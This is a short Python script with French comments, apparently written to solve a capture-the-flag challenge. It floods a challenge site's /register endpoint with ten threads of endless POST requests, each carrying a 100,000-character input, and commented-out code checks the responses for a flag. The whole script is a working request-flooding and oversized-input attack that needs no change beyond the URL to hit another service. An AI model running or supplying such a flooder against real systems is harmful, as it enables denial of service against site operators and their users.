import requests
import uuid
import time
import threading

# Configuration
URL = 'https://d24095fd7d9b604e.challenges.24hiut2025.ctfer.io/register'  # remplace par l’URL exacte si différente
INTERVAL = 0.000000001  # secondes
THREADS = 10 
# Fonction de génération de UUID + POST
def spam_loop():
    while True:
        guid = ('a' * 100000)  # 100k chars
        try:
            response = requests.post(URL, data={'input': guid}, timeout=5)
            # if response.status_code != 200 or 'flag' in response.text.lower():
            #     print(f"[!] Réponse suspecte avec {guid} → {response.status_code} : {response.text[:100]}")
            # else:
            #     print(f"[{response.status_code}] {guid}")
        except Exception as e:
            ...
            # print(f"[ERREUR] {guid} → {e}")

# Lancer plusieurs threads
def start_spam():
    for _ in range(THREADS):
        t = threading.Thread(target=spam_loop, daemon=True)
        t.start()
    # print(f"Spam en cours avec {THREADS} threads... Ctrl+C pour stopper.")

    while True:
        time.sleep(1)  # Garder le script vivant

if __name__ == '__main__':
    print("gf")
    start_spam()